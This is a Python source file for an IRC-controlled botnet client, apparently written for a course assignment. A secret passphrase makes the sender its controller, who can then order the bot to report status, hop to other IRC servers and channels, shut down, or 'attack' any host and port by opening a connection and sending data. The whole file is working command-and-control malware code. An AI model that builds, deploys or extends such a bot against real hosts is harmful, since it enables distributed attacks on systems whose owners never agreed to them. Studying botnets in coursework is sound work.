#python3 bot.py [server] [port] [channel without #] [passPhrase]
import argparse
import socket
import time
import socket
from threading import Timer
global channel

#start initial connection
def connect(name, args):
    sock = socket.socket()
    sock.connect((args.hostname, args.port))
    sock.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock.settimeout(1)
    sock.settimeout(None)
    sock.send("USER {} * * {}\r\n".format(name,name).encode("utf-8"))
    sock.send("JOIN #{}\r\n".format(args.channel).encode("utf-8"))
    return sock, name

#reconnect when disconnected
def reconnect(name, cc, ch, cp):
    sock = socket.socket()
    sock.connect((ch, int(cp)))
    sock.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock.settimeout(1)
    sock.settimeout(None)
    sock.send("USER {} * * {}\r\n".format(name,name).encode("utf-8"))
    sock.send("JOIN #{}\r\n".format(cc).encode("utf-8"))
    response = sock.recv(1024).decode("utf-8")
    if response.find ( 'PING' ) != -1:
        sock.send ( ('PONG ' + response.split() [ 1 ] + '\r\n').encode("utf-8"))
    if response.find ( 'PONG' ) != -1:
        sock.send ( ('PONG ' + response.split() [ 1 ] + '\r\n').encode("utf-8"))
    return sock, name

#checking port
def port_type(x):
    x = int(x)
    if x not in range(1,65535):
        raise argparse.ArgumentTypeError("Port must be in the range 1-65535")
    return x 

#getting command line arguments    
def parseArgs():
    parser = argparse.ArgumentParser(description = "Assignment 5")
    parser.add_argument("hostname", type = str, help="server")
    parser.add_argument("port", type = port_type, help="port")
    parser.add_argument("channel", type=str,help="channel")
    parser.add_argument("secret", type=str, help="password")
    args = parser.parse_args()
    return args

def parsemsg(s):
    prefix = ''
    trailing = []
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        arg = s.split()
        arg.append(trailing)
    else:
        arg = s.split()
    command = arg.pop(0)
    return prefix, command, arg

#send message to a channel
def chat(sock, channel,  msg):
    sock.send(("PRIVMSG #{} :{}\r\n".format(channel, msg)).encode("utf-8"))
    print("\n\n\t\t PRIVMSG #{} :{}".format(channel, msg))

#private message to a user
def chatPriv(sock, user,  msg):
    sock.send(("PRIVMSG {} :{}\r\n".format(user, msg)).encode("utf-8"))
    print("\n\n\t\t PRIVMSG #{} :{}".format(user, msg))

#move bot to a new irc server and channel
def move(sock, host, port, channel, name):
    print("controller name is " + controller)
    #sock.send(("PRIVMSG {} :{}\r\n".format(controller, "moving " + name)).encode("utf-8"))
    sock.settimeout(5)
    #sock.close()
    sock2 = socket.socket()
    sock2.connect((host, int(port)))
    sock2.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock2.settimeout(1)
    sock2.settimeout(None)
    sock2.send("USER {} * * {}\r\n".format(name,name).encode("utf-8"))
    sock2.send("JOIN #{}\r\n".format(channel).encode("utf-8"))
    sock.settimeout(None)
    time.sleep(30)
    sock.send(("PRIVMSG {} :{}\r\n".format(controller, "moved " + name)).encode("utf-8"))
    sock.close()
    return sock2, host, port, channel, name

#attack the specified hostname and port
def attack(host, port, name, attackcounter):
    try:
        attacker = socket.socket()
        attacker.settimeout(.2)
        attacker.connect((host, int(port)))
        attacker.send((name+" " + str(attackcounter)+"\n").encode("utf-8"))
        attacker.close()
        return "Success"
    except socket.error:
        return "Failure"

def main():
    #initialize variables
    name = "bot1"
    args = parseArgs()
    global controller
    controller = ""
    currentChannel = args.channel
    currentHost = args.hostname
    currentPort = args.port
    attackCounter = 1
    run = True
    (sock, name) = connect(name, args)
    print("Connected to IRC...")
    print("Secret phrase = ", args.secret)
    sock.settimeout(None)
    
    #Checking for messages in the server
    while run:
        try:
            #respond to the ping message
            response = sock.recv(1024).decode("utf-8")
            if response.find ( 'PING' ) != -1:
                sock.send ( ('PONG ' + response.split() [ 1 ] + '\r\n').encode("utf-8"))
            else:
                (prefix, command, arg)= parsemsg(response)
                
                #change nick if it is being used
                if command == "433":
                    name = name[0]+name[1]+name[2]+chr(ord(name[3])+1)
                    (sock, name) = connect(name, args)
                if command == "PRIVMSG":            
                    #nick of who sent the message
                    prefchan = prefix.split("!")
                    #set controller to be the nick of who sent it
                    if arg[1].strip() == args.secret:
                        controller = prefchan[0]
                        print("\t\tController is:", controller)
                
                    #send a pm to the controller with your name
                    if prefix.split("!")[0] == controller and arg[1].strip() == "status":
                        chatPriv(sock, controller, name)

                    #send a pm to the controller with your name
                    if prefix.split("!")[0] == controller and arg[1].split()[0] == "move":
                        splitting = arg[1].split()
                        (sock, currentHost, currentPort, currentChannel, name) = move(sock, splitting[1], splitting[2], splitting[3], name)

                    if prefix.split("!")[0] == controller and arg[1].split()[0] == "attack":
                        splitting = arg[1].split()
                        attackSuc = attack(splitting[1], splitting[2], name, attackCounter)
                        attackCounter = attackCounter + 1
                        chatPriv(sock, controller, attackSuc)
                    #send a pm to the controller with text shutdown
                    if prefix.split("!")[0] == controller and arg[1].strip() == "shutdown":
                        chatPriv(sock, controller, "shutdown {}".format(name))
                        chat(sock, currentHost, "QUIT")
                        run = False
                print(response)
        except:
            #if disconnected wait 5 seconds and try to reconnect
            while True:
                time.sleep(5)
                try:
                    (sock, name) = reconnect(name, currentChannel, currentHost, currentPort)
                    break
                except socket.error as e:
                    pass

    sock.close()

main()
